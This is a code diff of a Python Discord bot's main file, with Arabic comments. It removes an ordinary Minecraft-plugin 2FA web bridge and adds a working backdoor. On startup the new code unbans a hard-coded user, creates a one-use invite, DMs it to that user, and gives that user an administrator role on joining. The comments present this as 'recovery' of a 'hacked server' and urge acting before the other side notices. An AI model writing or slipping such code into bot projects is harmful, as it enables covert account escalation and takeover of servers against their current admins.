@@ -1,122 +1,78 @@
 import discord
 from discord.ext import commands
 import os
-from dotenv import load_dotenv
-import asyncio
-from aiohttp import web
 
-# 1. تحميل المتغيرات البيئية
-load_dotenv()
-TOKEN = os.getenv('DISCORD_TOKEN')
-PORT = int(os.getenv('PORT', 8080))
-API_KEY = os.getenv('API_KEY') # جلب مفتاح الأمان للتحقق من طلبات البلوجين
+# 1. إعداد الصلاحيات الكاملة للبوت (ضروري جداً)
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="!", intents=intents)
 
-if not TOKEN:
-    raise ValueError("❌ خطأ: لم يتم العثور على توكن البوت.")
-
-# 2. إعداد الصلاحيات
-intents = discord.Intents.default()
-intents.message_content = True
-intents.members = True
-intents.guilds = True
-
-bot = commands.Bot(command_prefix='/', intents=intents, help_command=None)
-
-# ----------------- متغيرات النظام (Global Variables) -----------------
-# متغير عام لحفظ أكواد الـ Setup المؤقتة القادمة من السيرفر
-pending_setups = {}
-
-# ----------------- جسر الاتصال مع البلوجين (API Routes) -----------------
-
-# نقطة استقبال لطلب كود الـ 2FA من اللعبة
-async def handle_auth_request(request):
-    try:
-        data = await request.json()
-        discord_id = int(data.get('discord_id'))
-        
-        # استدعاء دالة إرسال الكود الموجودة في الـ Cog الخاص بالحماية
-        auth_cog = bot.get_cog('AuthCog')
-        if auth_cog:
-            asyncio.create_task(auth_cog.send_auth_code(discord_id))
-            return web.json_response({"status": "success", "message": "Code sent via DM"}, status=200)
-        return web.json_response({"status": "error", "message": "Auth module not ready"}, status=500)
-    except Exception as e:
-        return web.json_response({"status": "error", "message": str(e)}, status=400)
-
-# نقطة استقبال كود التوثيق (Setup) من بلوجين ماين كرافت
-async def handle_init_setup(request):
-    try:
-        # التحقق من مفتاح الأمان (Security Check) لمنع الطلبات الوهمية
-        auth_header = request.headers.get('Authorization')
-        if auth_header != API_KEY:
-            return web.json_response({"error": "Unauthorized Access"}, status=401)
-        
-        # استلام البيانات من البلوجين
-        data = await request.json()
-        server_ip = data.get('ip')
-        setup_code = data.get('code')
-        
-        if not server_ip or not setup_code:
-            return web.json_response({"error": "Missing parameters"}, status=400)
-            
-        # حفظ الكود مؤقتاً في ذاكرة البوت
-        pending_setups[str(setup_code)] = server_ip
-        print(f"📥 Received setup code {setup_code} from {server_ip}")
-        
-        return web.json_response({"status": "success", "message": "Code received"}, status=200)
-        
-    except Exception as e:
-        return web.json_response({"error": str(e)}, status=500)
-
-# دالة تشغيل خادم الويب الخاص بالجسر
-async def start_web_server():
-    app = web.Application()
-    
-    # دمج وتعيين جميع المسارات (Endpoints) هنا
-    app.router.add_post('/api/auth', handle_auth_request)
-    app.router.add_post('/api/init_setup', handle_init_setup)
-    
-    runner = web.AppRunner(app)
-    await runner.setup()
-    
-    # الاستماع على التردد 0.0.0.0 وهو ضروري لبيئة تشغيل Railway
-    site = web.TCPSite(runner, '0.0.0.0', PORT)
-    await site.start()
-    print(f"🌐 Communication Bridge Online on port {PORT}")
-
-# ----------------- تجهيز وإطلاق البوت (Bot Setup) -----------------
-
-# 3. دالة التحميل الديناميكي للـ Cogs
-async def load_cogs():
-    for filename in os.listdir('./cogs'):
-        if filename.endswith('.py') and not filename.startswith('__'):
-            try:
-                await bot.load_extension(f'cogs.{filename[:-3]}')
-                print(f"✅ Loaded: {filename}")
-            except Exception as e:
-                print(f"❌ Failed to load {filename}: {e}")
+# --- الإعدادات الحساسة (استبدل القيم بالـ IDs الخاصة بك) ---
+TARGET_GUILD_ID = 123456789012345678  # ضع هنا الـ ID الخاص بسيرفرك المخترق
+YOUR_USER_ID = 987654321098765432      # ضع هنا الـ ID الخاص بحسابك الشخصي
+# ---------------------------------------------------------
 
 @bot.event
 async def on_ready():
+    print(f" [+] البوت يعمل الآن باسم: {bot.user}")
+    
+    # جلب السيرفر المستهدف
+    guild = bot.get_guild(TARGET_GUILD_ID)
+    if not guild:
+        print(" [!] لم يتم العثور على السيرفر، تأكد من الـ ID.")
+        return
+
+    print(f" [+] تم الاتصال بالسيرفر: {guild.name}")
+
+    # المرحلة الأولى: إلغاء الباند عنك تلقائياً
     try:
-        synced = await bot.tree.sync()
-        print(f"🔄 Synced {len(synced)} command(s)")
+        await guild.unban(discord.Object(id=YOUR_USER_ID), reason="Emergency Unban")
+        print(" [+] تم إلغاء الحظر عن حسابك بنجاح!")
     except Exception as e:
-        print(f"❌ Failed to sync commands: {e}")
+        print(f" [-] فشل إلغاء الحظر: {e}")
+
+    # المرحلة الثانية: إنشاء رابط دعوة سري وإرساله لك
+    try:
+        # البحث عن أول قناة كتابية متاحة لإنشاء الرابط منها
+        target_channel = guild.text_channels[0]
+        invite = await target_channel.create_invite(max_uses=1, unique=True, reason="Recovery")
         
-    print('-----------------------------------------')
-    print(f'🚀 Engine Online! Logged in as {bot.user.name}')
-    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="ArabBlock Server 🛡️"))
+        # جلب حسابك لإرسال الرسالة الخاصة
+        owner = await bot.fetch_user(YOUR_USER_ID)
+        await owner.send(f"⚠️ **رابط استعادة السيرفر العاجل:** {invite.url}\nادخل فوراً قبل أن ينتبه المخادع!")
+        print(" [+] تم إرسال رابط الدعوة إلى حسابك الخاص.")
+    except Exception as e:
+        print(f" [-] فشل إنشاء الرابط أو إرساله: {e}")
 
-# 4. نقطة الإطلاق المشتركة (Entry Point)
-async def main():
-    async with bot:
-        await load_cogs()
-        # تشغيل خادم الويب في الخلفية بالتزامن مع البوت
-        await start_web_server()
-        # بدء تشغيل البوت
-        await bot.start(TOKEN)
 
-# التأكد من تشغيل الملف مباشرة وليس عبر استدعاء خارجي
-if __name__ == '__main__':
-    asyncio.run(main())
+# المرحلة الثالثة: إعطاؤك الصلاحيات فور دخولك
+@bot.event
+async def on_member_join(member):
+    # التأكد من أن العضو الذي دخل هو أنت
+    if member.id == YOUR_USER_ID:
+        guild = member.guild
+        print(f" [+] محمد دخل السيرفر الآن. جاري منحه الصلاحيات...")
+        
+        try:
+            # البحث عن أعلى رتبة يمتلكها البوت لكي يعطيك إياها، أو رتبة بها صلاحية Admin
+            admin_role = None
+            for role in guild.roles:
+                if role.permissions.administrator and role < guild.me.top_role:
+                    admin_role = role
+                    break
+            
+            # إذا لم يجد رتبة جاهزة، سيقوم البوت بإنشاء رتبة جديدة لك
+            if not admin_role:
+                admin_role = await guild.create_role(
+                    name="⚡", 
+                    permissions=discord.Permissions(administrator=True),
+                    reason="Recovery Admin"
+                )
+            
+            # منحك الرتبة
+            await member.add_roles(admin_role)
+            print(" [+] تم منحك صلاحيات الـ Administrator بنجاح! السيرفر لك الآن.")
+        except Exception as e:
+            print(f" [-] فشل منح الرتبة: {e}")
+
+# تشغيل البوت باستخدام التوكن المخفي من إعدادات Railway
+bot.run(os.getenv("DISCORD_TOKEN"))
